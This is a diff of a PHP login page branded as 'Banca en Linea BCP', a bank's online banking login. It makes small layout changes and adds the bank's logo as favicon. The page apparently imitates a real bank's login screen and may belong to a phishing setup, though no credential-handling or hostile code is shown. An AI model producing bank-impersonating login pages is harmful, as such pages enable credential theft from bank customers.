@@ -1,7 +1,7 @@
 <?php
 $error = null;
 if (isset($_GET["error"])) {
-  $error = "Credenciales incorrectas";
+    $error = "Credenciales incorrectas";
 }
 ?>
 <!DOCTYPE html>
@@ -11,13 +11,13 @@ if (isset($_GET["error"])) {
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login | Banca en Linea BCP</title>
-    <link href="style_login.css" rel="stylesheet">
+    <link href="css/style_login.css" rel="stylesheet">
+    <link rel="shortcut icon" href="img/bcp_logo.png" type="image/x-icon">
 </head>
 
 <body>
     <main>
-        <!-- <?php // include 'modals/alerta_dispositivo.php' 
-    ?> -->
+        <!-- <?php include 'modals/alerta_dispositivo.php'?> -->
         <div class="logo"><img src="img/loguito.png" alt="logo_bcp.jpg"></div>
         <div class="flex">
             <!--Cambiar image-->
@@ -38,14 +38,14 @@ if (isset($_GET["error"])) {
                             autocomplete="off">
                     </div>
                     <?php if ($error != null): ?>
-                    <p class="error"><?= $error ?></p>
+                        <p class="error"><?= $error ?></p>
                     <?php endif; ?>
                     <button type="submit">Ingresar</button>
                 </form>
             </div>
         </div>
     </main>
-
+    <script src="js/"></script>
 </body>
 
 </html>
